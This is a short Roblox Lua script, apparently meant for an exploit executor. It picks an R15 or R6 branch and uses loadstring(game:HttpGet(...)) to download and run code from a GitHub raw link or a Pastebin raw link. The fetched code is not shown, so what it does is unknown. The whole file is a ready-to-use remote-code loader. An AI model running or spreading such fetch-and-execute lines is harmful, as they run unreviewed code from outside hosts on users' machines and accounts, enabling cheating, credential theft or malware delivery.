local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function executeScript()
    if character:FindFirstChild("Humanoid") then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid.RigType == Enum.HumanoidRigType.R15 then
            -- Replace with your R15 loadstring script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/faresal5070-spec/F/refs/heads/main/2"))()
        elseif humanoid.RigType == Enum.HumanoidRigType.R6 then
            -- Replace with your R6 loadstring script
            loadstring(game:HttpGet("https://pastebin.com/raw/83P97gYB"))()
        end
    end
end

executeScript()
